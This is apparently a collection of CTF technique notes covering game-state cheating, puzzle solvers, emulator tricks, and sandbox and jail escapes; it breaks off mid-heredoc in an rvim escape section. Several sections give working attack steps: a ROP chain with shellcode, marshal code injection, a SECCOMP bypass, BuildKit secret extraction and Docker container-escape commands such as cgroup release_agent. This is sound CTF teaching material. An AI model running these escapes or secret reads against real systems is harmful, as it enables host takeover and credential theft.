Challenges may stack multiple esoteric languages requiring sequential interpretation:

1. **Piet:** Visual programming language using colored pixel blocks. Execute PNG images as code:
```bash
npiet challenge.png         # npiet interpreter
# Or: java -jar PietDev.jar challenge.png
```

2. **Malbolge:** Extremely difficult esoteric language. Decode output from previous layer:
```bash
# Piet output → base64 decode → Malbolge source
echo "piet_output" | base64 -d > program.mal
malbolge program.mal        # Or use online interpreter
```

Common esoteric chains: Piet → base64 → Malbolge, Brainfuck → Ook → Whitespace, JSFuck → standard JS.

**Key insight:** When a PNG file doesn't contain obvious visual stego, try interpreting it as Piet code. Use `file` + visual inspection to identify the first layer, then decode sequentially.


# games-and-vms-2

# CTF Misc - Games, VMs & Constraint Solving (Part 2)

## Table of Contents
- [Cookie Checkpoint Game Brute-Forcing (BYPASS CTF 2025)](#cookie-checkpoint-game-brute-forcing-bypass-ctf-2025)
- [Flask Session Cookie Game State Leakage (BYPASS CTF 2025)](#flask-session-cookie-game-state-leakage-bypass-ctf-2025)
- [WebSocket Game Manipulation + Cryptic Hint Decoding (BYPASS CTF 2025)](#websocket-game-manipulation--cryptic-hint-decoding-bypass-ctf-2025)
- [Server Time-Only Validation Bypass (BYPASS CTF 2025)](#server-time-only-validation-bypass-bypass-ctf-2025)
- [De Bruijn Sequence for Substring Coverage (BearCatCTF 2026)](#de-bruijn-sequence-for-substring-coverage-bearcatctf-2026)
- [Brainfuck Interpreter Instrumentation (BearCatCTF 2026)](#brainfuck-interpreter-instrumentation-bearcatctf-2026)
- [WASM Linear Memory Manipulation (BearCatCTF 2026)](#wasm-linear-memory-manipulation-bearcatctf-2026)
- [References](#references)

---

## Cookie Checkpoint Game Brute-Forcing (BYPASS CTF 2025)

**Pattern (Signal from the Deck):** Server-side game where selecting tiles increases score. Incorrect choice resets the game. Score tracked via session cookies.

**Technique:** Save cookies before each guess, restore on failure to avoid resetting progress.

```python
import requests

URL = "https://target.example.com"

def solve():
    s = requests.Session()
    s.post(f"{URL}/api/new")

    while True:
        data = s.get(f"{URL}/api/signal").json()
        if data.get('done'):
            break

        checkpoint = s.cookies.get_dict()

        for tile_id in range(1, 10):
            r = s.post(f"{URL}/api/click", json={'clicked': tile_id})
            res = r.json()

            if res.get('correct'):
                if res.get('done'):
                    print(f"FLAG: {res.get('flag')}")
                    return
                break
            else:
                s.cookies.clear()
                s.cookies.update(checkpoint)
```

**Key insight:** Session cookies act as save states. Preserving and restoring cookies on failure enables deterministic brute-forcing without game reset penalties.

---

## Flask Session Cookie Game State Leakage (BYPASS CTF 2025)

**Pattern (Hungry, Not Stupid):** Flask game stores correct answers in signed session cookies. Use `flask-unsign -d` to decode the cookie and reveal server-side game state without playing.

```bash
# Decode Flask session cookie (no secret needed for reading)
flask-unsign -d -c '<cookie_value>'
```

**Example decoded state:**
```json
{
  "all_food_pos": [{"x": 16, "y": 12}, {"x": 16, "y": 28}, {"x": 9, "y": 24}],
  "correct_food_pos": {"x": 16, "y": 28},
  "level": 0
}
```

**Key insight:** Flask session cookies are signed but not encrypted by default. `flask-unsign -d` decodes them without the secret key, exposing server-side game state including correct answers.

**Detection:** Base64-looking session cookies with periods (`.`) separating segments. Flask uses `itsdangerous` signing format.

---

## WebSocket Game Manipulation + Cryptic Hint Decoding (BYPASS CTF 2025)

**Pattern (Maze of the Unseen):** Browser-based maze game with invisible walls. Checkpoints verified server-side via WebSocket. Cryptic hint encodes target coordinates.

**Technique:**
1. Open browser console, inspect WebSocket messages and `player` object
2. Decode cryptic hints (e.g., "mosquito were not available" → MQTT → port 1883)
3. Teleport directly to target coordinates via console

```javascript
function teleport(x, y) {
    player.x = x;
    player.y = y;
    verifyProgress(Math.round(player.x), Math.round(player.y));
    console.log(`Teleported to x:${player.x}, y:${player.y}`);
}

// "mosquito" → MQTT (port 1883), "not available" → 404
teleport(1883, 404);
```

**Common cryptic hint mappings:**
- "mosquito" → MQTT (Mosquitto broker, port 1883)
- "not found" / "not available" → HTTP 404
- Port numbers, protocol defaults, or ASCII values as coordinates

**Key insight:** Browser-based games expose their state in the JS console. Modify `player.x`/`player.y` or equivalent properties directly, then call the progress verification function.

---

## Server Time-Only Validation Bypass (BYPASS CTF 2025)

**Pattern (Level Devil):** Side-scrolling game requiring traversal of a map. Server validates that enough time has elapsed (map_length / speed) but doesn't verify actual movement.

```python
import requests
import time

TARGET = "https://target.example.com"

s = requests.Session()
r = s.post(f"{TARGET}/api/start")
session_id = r.json().get('session_id')

# Wait for required traversal time (e.g., 4800px / 240px/s = 20s + margin)
time.sleep(25)

s.post(f"{TARGET}/api/collect_flag", json={'session_id': session_id})
r = s.post(f"{TARGET}/api/win", json={'session_id': session_id})
print(r.json().get('flag'))
```

**Key insight:** When servers validate only elapsed time (not player position, inputs, or movement), start a session, sleep for the required duration, then submit the win request. Always check if the game API has start/win endpoints that can be called directly.

---

## De Bruijn Sequence for Substring Coverage (BearCatCTF 2026)

**Pattern (Brown's Revenge):** Server generates random n-bit binary code each round. Input must contain the code as a substring. Pass 20+ rounds with a single fixed input under a character limit.

```python
def de_bruijn(k, n):
    """Generate de Bruijn sequence B(k, n): cyclic sequence containing
    every k-ary string of length n exactly once as a substring."""
    a = [0] * k * n
    sequence = []
    def db(t, p):
        if t > n:
            if n % p == 0:
                sequence.extend(a[1:p+1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)
    db(1, 1)
    return sequence

# For 12-bit binary codes: B(2, 12) has length 4096
seq = ''.join(map(str, de_bruijn(2, 12)))
payload = seq + seq[:11]  # Linearize: 4096 + 11 = 4107 chars
# Every possible 12-bit code appears as a substring
```

**Key insight:** De Bruijn sequence B(k, n) contains all k^n possible n-length strings over alphabet k as substrings, with cyclic length k^n. To linearize (non-cyclic), append the first n-1 characters. Total length = k^n + n - 1. Send the same string every round — it contains every possible code.

**Detection:** Must find arbitrary n-bit pattern as substring of limited-length input. Character budget matches de Bruijn length (k^n + n - 1).

---

## Brainfuck Interpreter Instrumentation (BearCatCTF 2026)

**Pattern (Ghost Ship):** Large Brainfuck program (10K+ instructions) validates a flag character-by-character. Full reverse engineering is impractical.

**Per-character brute-force via instrumentation:**
1. Instrument a Brainfuck interpreter to track tape cell values
2. Identify a "wrong count" cell that increments per incorrect character
3. For each position, try all printable ASCII — pick the character that doesn't increment the wrong counter

```python
def run_bf_instrumented(code, input_bytes, max_steps=500000):
    tape = [0] * 30000
    dp, ip, inp_idx = 0, 0, 0
    for _ in range(max_steps):
        if ip >= len(code): break
        c = code[ip]
        if c == '+': tape[dp] = (tape[dp] + 1) % 256
        elif c == '-': tape[dp] = (tape[dp] - 1) % 256
        elif c == '>': dp += 1
        elif c == '<': dp -= 1
        elif c == '.': pass  # output
        elif c == ',':
            tape[dp] = input_bytes[inp_idx] if inp_idx < len(input_bytes) else 0
            inp_idx += 1
        elif c == '[' and tape[dp] == 0:
            # skip to matching ]
            ...
        elif c == ']' and tape[dp] != 0:
            # jump back to matching [
            ...
        ip += 1
    return tape

# Brute-force: ~40 positions × 95 chars = 3800 runs
flag = []
for pos in range(40):
    for c in range(32, 127):
        candidate = flag + [c] + [ord('A')] * (39 - pos)
        tape = run_bf_instrumented(code, candidate)
        if tape[WRONG_COUNT_CELL] == 0:  # No errors up to this position
            flag.append(c)
            break
```

**Key insight:** Brainfuck programs that validate input character-by-character can be brute-forced without understanding the program logic. Instrument the interpreter to observe tape state, find the cell that tracks validation progress, and optimize per-character search. ~3800 runs completes in minutes.

---

## WASM Linear Memory Manipulation (BearCatCTF 2026)

**Pattern (Dubious Doubloon):** Browser game compiled to WebAssembly with win conditions requiring luck (e.g., 15 consecutive coin flips). WASM linear memory is flat and unprotected.

**Direct memory patching in Node.js:**
```javascript
const { readFileSync } = require('fs');
const wasmBuffer = readFileSync('game.wasm');
const { instance } = await WebAssembly.instantiate(wasmBuffer, imports);
const mem = new DataView(instance.exports.memory.buffer);

// Patch game variables at known offsets
mem.setInt32(0x102918, 14, true);   // streak counter = 14 (need 15)
mem.setInt32(0x102898, 100, true);  // win chance = 100%

// One more flip → guaranteed win → flag decoded
const result = instance.exports.flipCoin();
```

**Key insight:** Unlike WAT patching (modifying the binary), memory manipulation patches runtime state after loading. All WASM variables live in flat linear memory at fixed offsets. Use `wasm-objdump -x game.wasm` or search for known constants to find variable offsets. No need to understand the full game logic — just set the state to "about to win".

**Detection:** WASM game requiring statistically impossible sequences (streaks, perfect scores). Game logic is in `.wasm` file loadable in Node.js.

---

## References
- BYPASS CTF 2025 "Signal from the Deck": Cookie checkpoint game brute-forcing
- BYPASS CTF 2025 "Hungry, Not Stupid": Flask cookie game state leakage
- BYPASS CTF 2025 "Maze of the Unseen": WebSocket teleportation + cryptic hints
- BYPASS CTF 2025 "Level Devil": Server time-only validation bypass
- BearCatCTF 2026 "Brown's Revenge": De Bruijn sequence substring coverage
- BearCatCTF 2026 "Ghost Ship": Brainfuck instrumentation brute-force
- BearCatCTF 2026 "Dubious Doubloon": WASM linear memory state patching

---

See also: [games-and-vms.md](games-and-vms.md) for WASM patching, Roblox reversing, PyInstaller, Z3, K8s RBAC, floating-point exploitation, custom assembly sandbox escape, and multi-phase crypto games.


# games-and-vms-3

# CTF Misc - Games, VMs & Constraint Solving (Part 3)

## Table of Contents
- [memfd_create Packed Binaries](#memfd_create-packed-binaries)
- [Multi-Phase Interactive Crypto Game (EHAX 2026)](#multi-phase-interactive-crypto-game-ehax-2026)
- [Emulator ROM-Switching State Preservation (BSidesSF 2026)](#emulator-rom-switching-state-preservation-bsidessf-2026)
- [Python Marshal Code Injection (iCTF 2013)](#python-marshal-code-injection-ictf-2013)
- [Benford's Law Frequency Distribution Bypass (iCTF 2013)](#benfords-law-frequency-distribution-bypass-ictf-2013)
- [Parallel Connection Oracle Relay (Hack.lu 2015)](#parallel-connection-oracle-relay-hacklu-2015)
- [Nonogram Solver to QR Code Pipeline (SECCON 2015)](#nonogram-solver-to-qr-code-pipeline-seccon-2015)
- [100 Prisoners Problem / Cycle-Following Strategy (Sharif CTF 2016)](#100-prisoners-problem--cycle-following-strategy-sharif-ctf-2016)
- [C Code Jail Escape via Emoji Identifiers and Gadget Embedding (Midnight Flag 2026)](#c-code-jail-escape-via-emoji-identifiers-and-gadget-embedding-midnight-flag-2026)
  - [Step 1: Integer construction from emoji](#step-1-integer-construction-from-emoji)
  - [Step 2: Embed gadgets via add eax constant encoding](#step-2-embed-gadgets-via-add-eax-constant-encoding)
  - [Step 3: Stack-based ROP via push rsp; pop rsi; syscall](#step-3-stack-based-rop-via-push-rsp-pop-rsi-syscall)
  - [Step 4: ROP chain to mprotect + read + shellcode](#step-4-rop-chain-to-mprotect--read--shellcode)
  - [Step 5: Shellcode with glob for unknown flag path](#step-5-shellcode-with-glob-for-unknown-flag-path)
- [BuildKit Daemon Exploitation for Build Secrets (BSidesSF 2026)](#buildkit-daemon-exploitation-for-build-secrets-bsidessf-2026)
- [Docker Container Escape Techniques](#docker-container-escape-techniques)
  - [Privileged Container Breakout](#privileged-container-breakout)
  - [Docker Socket Escape](#docker-socket-escape)
  - [Capability-Based Escape (CAP_SYS_ADMIN)](#capability-based-escape-cap_sys_admin)
  - [Container Information Leakage](#container-information-leakage)
- [Levenshtein Distance Oracle Attack (SunshineCTF 2016)](#levenshtein-distance-oracle-attack-sunshinectf-2016)
- [SECCOMP Bypass via High-Bit File Descriptor Trick (33C3 CTF 2016)](#seccomp-bypass-via-high-bit-file-descriptor-trick-33c3-ctf-2016)
- [rvim Jail Escape via Custom vimrc with Python3 Execution (BKP 2017)](#rvim-jail-escape-via-custom-vimrc-with-python3-execution-bkp-2017)
- [References](#references)

---

## memfd_create Packed Binaries

```python
from Crypto.Cipher import ARC4
cipher = ARC4.new(b"key")
decrypted = cipher.decrypt(encrypted_data)
open("dumped", "wb").write(decrypted)
```

**Key insight:** Binaries using `memfd_create` execute payloads entirely in memory, leaving no file on disk. Intercept the decrypted payload before `fexecve` by hooking `memfd_create` or dumping `/proc/pid/fd/` entries, then analyze the dumped binary normally.

---

## Multi-Phase Interactive Crypto Game (EHAX 2026)

**Pattern (The Architect's Gambit):** Server presents a multi-phase challenge combining cryptography, game theory, and commitment-reveal protocols.

**Phase structure:**
1. **Phase 1 (AES-ECB decryption):** Decrypt pile values with provided key. Determine winner from game state.
2. **Phase 2 (AES-CBC with derived keys):** Keys derived via SHA-256 chain from Phase 1 results. Decrypt to get game parameters.
3. **Phase 3 (Interactive gameplay):** Play optimal moves in a combinatorial game, bound by commitment-reveal protocol.

**Commitment-reveal (HMAC binding):**
```python
import hmac, hashlib

def compute_binding_token(session_nonce, answer):
    """Server verifies your answer commitment before revealing result."""
    message = f"answer:{answer}".encode()
    return hmac.new(session_nonce, message, hashlib.sha256).hexdigest()

# Flow: send token first, then server reveals state, then send answer
# Server checks: HMAC(nonce, answer) == your_token
# Prevents changing your answer after seeing the state
```

**GF(2^8) arithmetic for game drain calculations:**
```python
# Galois Field GF(256) used in some game mechanics (Nim variants)
# Nim-value XOR determines winning/losing positions

def gf256_mul(a, b, poly=0x11b):
    """Multiply in GF(2^8) with irreducible polynomial."""
    result = 0
    while b:
        if b & 1:
            result ^= a
        a <<= 1
        if a & 0x100:
            a ^= poly
        b >>= 1
    return result

# Nim game with GF(256) move rules:
# Position is losing if Nim-value (XOR of pile Grundy values) is 0
# Optimal move: find pile where removing stones makes XOR sum = 0
```

**Game tree memoization (C++ for performance):**
```python
# Python too slow for large state spaces — use C++ with memoization
# State compression: encode all pile sizes into single integer
# Cache: unordered_map<state_t, bool> for win/loss determination

# Python fallback for small games:
from functools import lru_cache

@lru_cache(maxsize=None)
def is_winning(state):
    """Returns True if current player can force a win."""
    state = tuple(sorted(state))  # Normalize for caching
    for move in generate_moves(state):
        next_state = apply_move(state, move)
        if not is_winning(next_state):
            return True  # Found a move that puts opponent in losing position
    return False  # All moves lead to opponent winning
```

**Key insights:**
- Multi-phase challenges require solving each phase sequentially — each phase's output feeds the next
- HMAC commitment-reveal prevents guessing; you must compute the correct answer
- GF(256) Nim variants require Sprague-Grundy theory, not brute force
- When Python recursion is too slow (>10s), rewrite game solver in C++ with state compression and memoization

---

## Emulator ROM-Switching State Preservation (BSidesSF 2026)

**Pattern (wromwarp):** In emulator debuggers, the `/load` command may replace only the ROM program while preserving CPU state (registers, RAM, program counter). By switching between ROMs at specific PC values, you can execute arbitrary instruction sequences using instructions from different programs.

**Key insight:** When a new ROM is loaded via the emulator's debug interface, the CPU state (registers, RAM, PC) remains unchanged. Only the program memory (ROM) is replaced. This means:
- If ROM A has loaded secret data into RAM at certain addresses
- And ROM B has a `display` instruction at the same PC where ROM A's execution paused
- Loading ROM B at that point causes the CPU to execute ROM B's instruction (display) using ROM A's data (the secret)

**Exploit workflow:**
```text
1. Load ROM_A (contains INIT that loads secret into RAM)
2. Step through ROM_A until secret data is in RAM
3. Note the current PC value
4. /load ROM_B (PC, registers, RAM all preserved)
5. ROM_B has a "display memory" instruction at the current PC
6. Step → executes ROM_B's display instruction, showing ROM_A's secret data
```

**Practical example:**
```python
from pwn import *

p = remote('target', port)

# Load first ROM that initializes secret data
p.sendlineafter('> ', '/load rom_init.bin')
# Step until secret is in memory (determined by analysis)
for _ in range(42):
    p.sendlineafter('> ', '/step')

# Switch to ROM that displays memory at current PC
p.sendlineafter('> ', '/load rom_display.bin')
p.sendlineafter('> ', '/step')

# Read the leaked secret
flag = p.recvline().strip()
print(f"Flag: {flag}")
```

**When to recognize:**
- Emulator/debugger challenge with `/load`, `/step`, `/run`, `/dump` commands
- Multiple ROM files provided
- One ROM initializes protected memory, another has display/output capabilities
- Challenge mentions "ROM switching", "hot swap", or "state preservation"

**Key lessons:**
- Emulator debug interfaces that don't reset CPU state on ROM load create a state-mixing vulnerability
- Combine instructions from different programs by loading them at the right PC values
- Protected memory (read-only in one ROM's context) becomes accessible via another ROM's display instructions

**References:** BSidesSF 2026 "wromwarp"

---

## Python Marshal Code Injection (iCTF 2013)

**Pattern:** Server deserializes base64-encoded `marshal` data and executes it as a Python function. Inject arbitrary code via serialized function code objects.

```python
import marshal, types, base64

# Craft payload function that exfiltrates data over the socket
payload = lambda sock: sock.send(globals()['flag'].encode())

# Serialize the function's code object
serialized = base64.b64encode(marshal.dumps(payload.__code__)).decode()

# Server-side execution pattern:
# func = types.FunctionType(marshal.loads(base64.b64decode(data)), globals())
# func(client_socket)
```

**Key insight:** `marshal.loads()` is as dangerous as `pickle.loads()` — it deserializes arbitrary Python code objects. Unlike pickle, marshal is rarely sandboxed. The injected function runs with access to the server's `globals()`, enabling flag exfiltration via the socket connection.

---

## Benford's Law Frequency Distribution Bypass (iCTF 2013)

**Pattern:** Server validates that input digit frequency matches Benford's Law distribution (+-5% tolerance). Craft input with correct digit distribution to pass the check.

```python
import random

# Benford's Law: P(d) = log10(1 + 1/d) for leading digit d (1-9)
benford = {d: round(100 * (1 + 1/d) / sum(1/i for i in range(1,10))) for d in range(1,10)}
# Approx: 1→30%, 2→18%, 3→12%, 4→10%, 5→8%, 6→7%, 7→6%, 8→5%, 9→5%

def generate_benford_compliant(length=1000):
    digits = []
    for d, pct in benford.items():
        digits.extend([str(d)] * int(length * pct / 100))
    random.shuffle(digits)
    return ''.join(digits[:length])
```

**Key insight:** Benford's Law describes the frequency of leading digits in naturally occurring datasets. If a service validates digit distribution, generate compliant input rather than random numbers. Tolerance is typically +-5%, so approximate percentages work.

---

## Parallel Connection Oracle Relay (Hack.lu 2015)

When a server generates deterministic sequences and provides feedback, exploit multiple simultaneous connections to share answers:

1. Open N+1 connections with identical timing (same PRNG seed)
2. Sacrifice one connection per round to discover the correct answer
3. Relay discovered answer to remaining connections via synchronization

```python
import threading

NUM_CONNECTIONS = 101
barriers = [threading.Barrier(NUM_CONNECTIONS - i) for i in range(100)]
correct_answers = [None] * 100

def worker(index, sock):
    for round_num in range(100):
        barriers[round_num].wait()  # Synchronize all threads

        if index == round_num:
            # This thread sacrifices itself to probe
            for guess in range(100):
                sock.send(str(guess).encode())
                response = sock.recv(1024)
                if b'correct' in response:
                    correct_answers[round_num] = guess
                    break
        else:
            # Wait for oracle thread to find answer
            barriers[round_num].wait()
            sock.send(str(correct_answers[round_num]).encode())

threads = [threading.Thread(target=worker, args=(i, connections[i])) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
```

**Key insight:** Works against any service where multiple connections share state (same PRNG seed from identical connection times). The sacrifice pattern ensures at least one connection survives all rounds.

---

## Nonogram Solver to QR Code Pipeline (SECCON 2015)

Automate solving nonogram puzzles that produce QR codes:

1. **Parse constraints** from web interface (BeautifulSoup for HTML tables)
2. **Solve nonogram** using external solver or constraint propagation
3. **Render to image** and decode QR

```python
from PIL import Image
import subprocess, qrtools

# Parse row/column constraints from HTML
rows = parse_constraints(html, 'rows')   # [[3,1], [2,2], ...]
cols = parse_constraints(html, 'cols')

# Feed to nonogram solver (e.g., nonogram-0.9)
solver_input = format_for_solver(rows, cols)
result = subprocess.run(['./nonogram'], input=solver_input, capture_output=True)

# Convert text grid to QR image
grid = parse_solver_output(result.stdout)
cell_size = 10
img = Image.new('RGB', (len(grid[0]) * cell_size, len(grid) * cell_size), 'white')
# Draw black cells where grid == '#'

# Decode QR
qr = qrtools.QR()
qr.decode('qrcode.png')
answer = qr.data
```

**Key insight:** Nonogram solvers are available as command-line tools. The key challenge is parsing the web interface and converting output to a valid QR image. Add quiet zones (white border) around the QR for reliable decoding.

---

## 100 Prisoners Problem / Cycle-Following Strategy (Sharif CTF 2016)

The classic 100 prisoners problem appears in CTF challenges as an "impossible" probability game:

- N prisoners each open N/2 boxes looking for their number
- All must succeed for the group to win
- Optimal strategy: follow permutation cycles (success rate ~31%)

```python
def solve_prisoners(boxes):
    """Follow cycle starting from own number"""
    N = len(boxes)
    results = []
    for prisoner in range(N):
        current = prisoner
        found = False
        for _ in range(N // 2):
            if boxes[current] == prisoner:
                found = True
                break
            current = boxes[current]  # Follow the cycle
        results.append(found)
    return all(results)
```

**Key insight:** Random strategy succeeds with probability (1/2)^N ≈ 0. Cycle-following succeeds with probability 1 - ln(2) ≈ 0.3069 for large N. The game fails only if any cycle exceeds length N/2. Pre-check cycle lengths if the box arrangement is known.

---

## C Code Jail Escape via Emoji Identifiers and Gadget Embedding (Midnight Flag 2026)

Escape a C code jail that bans all alphanumeric characters, whitespace, and most operators by using GCC's Unicode identifier support and embedding machine code gadgets inside arithmetic constants.

**Constraints:** Only `(){}[];,=.+*%@#~` and emoji allowed. No letters, digits, whitespace, quotes, or `?&!|$<>^:/-`.

### Step 1: Integer construction from emoji

GCC allows emoji as identifiers. `(😃==😃)` is compile-time constant `1`. Build any integer via addition and multiplication:

```c
// Building 15: 3 * (2*2 + 1)
((😃==😃)+(😃==😃)+(😃==😃))*(((😃==😃)+(😃==😃))*((😃==😃)+(😃==😃))+(😃==😃))
```

### Step 2: Embed gadgets via add eax constant encoding

At `-O0`, `var = var + CONSTANT` compiles to `05 XX XX XX XX` (add eax, imm32). Jump to offset+1 to execute the constant bytes as instructions:

| Target bytes | Instruction | Constant (decimal) |
|---|---|---|
| `0f 05 c3` | syscall; ret | 12780815 |
| `58 c3` | pop rax; ret | 50008 |
| `5f c3` | pop rdi; ret | 50015 |
| `5a c3` | pop rdx; ret | 50010 |
| `5e c3` | pop rsi; ret | 50014 |
| `54 5e 0f 05` | push rsp; pop rsi; syscall | 84893268 |

```c
// Each gadget function embeds one instruction sequence:
😇(){😼=😼+<12780815_as_emoji_expr>;}  // syscall; ret at 😇+15
```

### Step 3: Stack-based ROP via push rsp; pop rsi; syscall

Call the `push rsp; pop rsi; syscall` gadget with `sys_read` args to write a ROP chain directly to the stack return address:

```c
// (gadget_func + 15)(stdin=0, buf=ignored_rsp_used, len=4096)
😀(){(😃+<15_expr>)(😷,😸,<4096_expr>);}
```

The `push rsp` captures the return address location, `pop rsi` sets it as the read buffer, then `syscall` reads attacker input onto the stack.

### Step 4: ROP chain to mprotect + read + shellcode

```python
from pwn import *

rop = flat([
    0xdeadbeef,      # consumed by pop rbp
    POP_RAX, 10,     # sys_mprotect
    POP_RDI, 0x404000,
    POP_RSI, 0x2000,
    POP_RDX, 7,      # PROT_READ|WRITE|EXEC
    SYSCALL_RET,
    POP_RAX, 0,      # sys_read
    POP_RDI, 0,      # stdin
    POP_RSI, 0x404020,
    POP_RDX, 0x200,
    SYSCALL_RET,
    0x404020,         # jump to shellcode
])
```

### Step 5: Shellcode with glob for unknown flag path

```python
# execve("/bin/sh", ["/bin/sh", "-c", "cat /flag*"], NULL)
shellcode = asm(shellcraft.execve("/bin/sh", ["/bin/sh", "-c", "cat /flag*"]))
```

**Key insight:** GCC's `-static -nostartfiles -nostdlib` produces a minimal binary with deterministic addresses (no ASLR). Each emoji function lands at a predictable address (0x401000, 0x40101c, ...). The `add eax, imm32` encoding is the key primitive — any 4-byte gadget sequence can be embedded as an arithmetic constant in a valid C expression.

**Compilation flags to watch for:** `-nostartfiles -nostdlib -static` indicates no libc, no CRT, deterministic layout — ideal for address-hardcoded exploits.

---

## BuildKit Daemon Exploitation for Build Secrets (BSidesSF 2026)

**Pattern (builds-as-a-service):** Challenge accepts a Dockerfile and builds it. The build environment uses Docker BuildKit with `--mount=type=secret,id=flag` to inject secrets during build. An exposed BuildKit daemon (tcp://127.0.0.1:1234) allows submitting nested build requests that mount and read the secret.

**Attack (two-stage Dockerfile):**

Stage 1 — Submit a Dockerfile that installs `buildctl` and triggers a nested build:
```dockerfile
FROM moby/buildkit:v0.17.1-rootless
COPY Dockerfile.exploit /tmp/Dockerfile
RUN <<'EOF'
buildctl --addr tcp://127.0.0.1:1234 build \
  --frontend dockerfile.v0 \
  --local context=/tmp --local dockerfile=/tmp \
  --opt filename=Dockerfile.exploit \
  --progress plain 2>&1; false
EOF
```

Stage 2 — The nested Dockerfile (`Dockerfile.exploit`) mounts and reads the secret:
```dockerfile
FROM alpine
RUN --mount=type=secret,id=flag cat /run/secrets/flag; false
```

**Why `; false`:** Forces a non-zero exit code which causes BuildKit to dump the full build output (including the flag) to stderr. Without it, successful builds may suppress intermediate output.

**Key insight:** BuildKit's gRPC API on localhost is unauthenticated by default. Any container running in the same network namespace can submit build requests. The `--mount=type=secret` mechanism is designed for build-time secrets but relies on the daemon being inaccessible — if the daemon is exposed, any build can request any secret.

**Alternative approach:** If `buildctl` is unavailable, use the BuildKit gRPC API directly:
```python
# buildctl du / buildctl debug workers  — enumerate available workers
# buildctl build --progress=plain — trace build output
```

**When to recognize:** Challenge provides a Dockerfile upload/build service. Look for BuildKit features (`--mount=type=secret`, `BUILDKIT_INLINE_CACHE`, `# syntax=` directives). Check if the build daemon is accessible from within built containers.

**Real-world relevance:** This mirrors actual CI/CD supply chain attacks where build systems expose secrets to untrusted build steps. GitHub Actions, GitLab CI, and Jenkins all have similar secret injection mechanisms.

**References:** BSidesSF 2026 "builds-as-a-service"

---

## Docker Container Escape Techniques

### Privileged Container Breakout

Containers started with `--privileged` have all Linux capabilities and access to host devices. Mount the host filesystem and chroot:

```bash
# List host disks
fdisk -l
# Mount host root filesystem
mkdir /mnt/host && mount /dev/sda1 /mnt/host
# Chroot to host
chroot /mnt/host /bin/bash
# Or via nsenter (requires PID 1 on host)
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### Docker Socket Escape

If `/var/run/docker.sock` is mounted inside the container, create a new privileged container that mounts the host root:

```bash
# Check for socket
ls -la /var/run/docker.sock
# Escape: create privileged container with host root mounted
docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host /bin/bash
# Or via API if docker CLI unavailable:
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
```

### Capability-Based Escape (CAP_SYS_ADMIN)

With `CAP_SYS_ADMIN`, exploit cgroup release_agent for host command execution:

```bash
# Create cgroup, set release_agent to host command
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo 'cat /flag > /tmp/cgrp/x/flag' >> /cmd && chmod +x /cmd
echo $$ > /tmp/cgrp/x/cgroup.procs  # Trigger release_agent
```

### Container Information Leakage

Even without escape, containers leak host info:
- `/proc/self/cgroup` -- container ID
- `/proc/mounts` -- overlayfs `upperdir` reveals host path
- `/sys/kernel/slab/*/cgroup/` -- other container IDs (cgroup debug info)
- `/proc/1/environ` -- environment variables from container start

**Key insight:** Check `--privileged` flag, mounted sockets (`docker.sock`), and capabilities (`capsh --print`) first. Privileged = instant escape. Socket = create new privileged container. CAP_SYS_ADMIN = cgroup release_agent. Without any of these, focus on information leakage and application-level escapes.

---

## References
- EHAX 2026 "The Architect's Gambit": Multi-phase AES + HMAC + GF(256) Nim
- BSidesSF 2026 "wromwarp": Emulator ROM-switching state preservation
- iCTF 2013: Python marshal code injection, Benford's Law bypass
- Hack.lu 2015: Parallel connection oracle relay
- SECCON 2015: Nonogram solver to QR code pipeline
- Sharif CTF 2016: 100 prisoners problem / cycle-following strategy
- Midnight Flag 2026: C code jail escape via emoji identifiers
- BSidesSF 2026 "builds-as-a-service": BuildKit daemon build secret exploitation
- SunshineCTF 2016: Levenshtein distance oracle attack

---

## Levenshtein Distance Oracle Attack (SunshineCTF 2016)

Oracle responds with edit distance between guess and secret. Attack strategy:

1. **Determine length:** Submit empty string, distance = secret length
2. **Identify present characters:** Submit single repeated character (e.g., "aaaa..."), distance = len - count_of_that_char
3. **Locate positions:** Binary search -- fill half positions with known-present char, half with known-absent, narrow by distance change

```python
# Determine which chars are present
for c in string.printable:
    d = oracle(c * length)
    count = length - d  # Number of times c appears
    if count > 0:
        chars[c] = count
```

**Key insight:** Edit distance as a side channel. Binary search locates character positions from Levenshtein feedback in O(n log n) queries.

---

## SECCOMP Bypass via High-Bit File Descriptor Trick (33C3 CTF 2016)

**Pattern (tea):** SECCOMP filter blocks `close(fd)` for fd values 0, 1, and 2 (stdin/stdout/stderr). Bypass: `close(0x8000000000000002)` passes the 64-bit comparison (not equal to 2) but the kernel truncates the fd argument to 32 bits, actually closing fd 2. This frees fd 2, so the next `open()` returns fd 2. Now `write(2, ...)` writes to the newly opened file instead of stderr, and SECCOMP allows it because fd 2 was never explicitly blocked for write.

```c
// SECCOMP rule: deny close(fd) where fd == 0 || fd == 1 || fd == 2
// Bypass: close with high-bit set
close(0x8000000000000002);  // SECCOMP sees fd != 2 (64-bit compare) -> ALLOW
// Kernel: fd = (int)(0x8000000000000002) = 2 -> closes fd 2

open("/proc/self/mem", O_WRONLY);  // returns fd 2 (lowest available)
// Now write to /proc/self/mem via fd 2 to modify parent process memory
```

**Key insight:** SECCOMP BPF operates on the raw 64-bit syscall argument, but the kernel's `close()` implementation casts to `int` (32-bit). Setting bit 63 changes the 64-bit value while preserving the 32-bit truncated result. This type/width mismatch between SECCOMP filter and kernel syscall handler is a general bypass pattern — check argument widths for any filtered syscall.

---

## rvim Jail Escape via Custom vimrc with Python3 Execution (BKP 2017)

**Pattern (vimjail):** `rvim` (restricted vim) blocks `:!`, `:shell`, and similar command execution. However, `rvim -u custom_vimrc` loads a user-specified vimrc file that executes before restrictions are fully applied. If `rvim` is run via `sudo -u targetuser`, the vimrc can contain `:python3 import os; os.system("cmd")` to execute commands as the target user.

```bash
# Create malicious vimrc
cat > /tmp/evil_vimrc << 'EOF'
